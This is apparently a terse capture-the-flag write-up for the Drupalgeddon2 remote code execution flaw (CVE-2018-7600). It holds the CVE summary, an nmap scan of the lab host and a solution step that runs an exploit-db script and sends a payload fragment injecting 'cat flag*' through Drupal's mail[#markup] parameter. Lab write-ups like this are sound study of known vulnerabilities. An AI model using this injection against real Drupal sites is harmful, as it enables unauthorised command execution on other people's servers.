
# 1 Drupal # CVE-2018-7600

https://www.cve.org/CVERecord?id=CVE-2018-7600

Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations.

https://www.exploit-db.com/exploits/44482

Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)

---

# 2 nmap

```
❯ nmap 34.87.33.218 -p 80 -T4 -A
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-13 23:31 +07
Nmap scan report for 34.87.33.218
Host is up (0.029s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Welcome to Drupal CVE-2018-7600 | Drupal CVE-2018-7600
|_http-server-header: Apache/2.4.25 (Debian)
|_http-generator: Drupal 8 (https://www.drupal.org)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: bridge|general purpose|VoIP adapter
Running (JUST GUESSING): Oracle Virtualbox (92%), Slirp (92%), QEMU (92%), AT&T embedded (90%)
OS CPE: cpe:/o:oracle:virtualbox cpe:/a:danny_gasparovski:slirp cpe:/a:qemu:qemu
Aggressive OS guesses: Oracle Virtualbox Slirp NAT bridge (92%), QEMU user mode network gateway (92%), AT&T BGW210 voice gateway (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   0.32 ms 34.87.33.218

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.82 seconds

```

---

# 3 solution

`searchsploit 44448.py -m`

set iptarget, proxy

`...&mail%5B%23markup%5D=cat flag*`

---

# end
